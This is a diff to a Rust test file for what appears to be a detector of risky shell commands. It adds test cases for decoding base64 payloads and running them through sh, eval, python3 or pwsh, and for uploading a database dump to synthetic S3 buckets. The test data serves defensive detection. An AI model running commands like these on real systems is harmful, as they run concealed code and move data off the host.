@@ -536,6 +536,10 @@ fn encoded_payload_requires_an_observable_execution_step() {
             "iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s)))",
             "base64 -d payload.b64 > /tmp/run.sh && bash /tmp/run.sh",
             "base64 -d payload.b64 > tool; chmod +x tool; ./tool",
+            "base64 -d payload.b64 2>&1 | sh",
+            "p=$(echo U1lOVEhFVElD | base64 -d); eval \"$p\"",
+            "base64 -d payload.b64 > run.py && python3 run.py",
+            "base64 -d payload.b64 > run.ps1; pwsh -File run.ps1",
         ],
         &[
             "base64 --decode documented-fixture.b64",
@@ -546,6 +550,7 @@ fn encoded_payload_requires_an_observable_execution_step() {
             "echo $KEYSTORE | base64 -d > release.jks && ./gradlew assembleRelease",
             "[IO.File]::WriteAllBytes('a.bin', [Convert]::FromBase64String($s))",
             "certutil -decode cert.b64 cert.cer",
+            "base64 -d data.b64 > data.json && jq . data.json",
         ],
     );
 }
@@ -586,6 +591,9 @@ fn object_storage_copy_counts_only_local_to_remote_uploads() {
             "rclone copy ./reports synthetic-remote:archive",
             "az storage blob upload --container-name c --name n --file dump.sql",
             "az storage blob upload-batch --destination c --source ./dist",
+            "aws s3 cp --profile fixture dump.sql s3://synthetic-bucket/",
+            "aws s3 cp --region=us-east-1 dump.sql s3://synthetic-bucket/",
+            "aws s3 cp C:\\data\\dump.sql s3://synthetic-bucket/",
         ],
         &[
             "aws s3 cp s3://synthetic-bucket/a ./a",
@@ -593,7 +601,7 @@ fn object_storage_copy_counts_only_local_to_remote_uploads() {
             "gsutil cp gs://synthetic-bucket/a.tar .",
             "rclone copy synthetic-remote:archive ./reports",
             "aws s3 cp s3://synthetic-bucket/a s3://other-bucket/a",
-            "aws s3 cp --profile fixture dump.sql s3://synthetic-bucket/",
+            "aws s3 cp s3://synthetic-bucket/a ./b --profile fixture",
             "az storage account list",
             "az storage container list --account-name acct",
             "az storage blob download --container-name c --name n --file dump.sql",
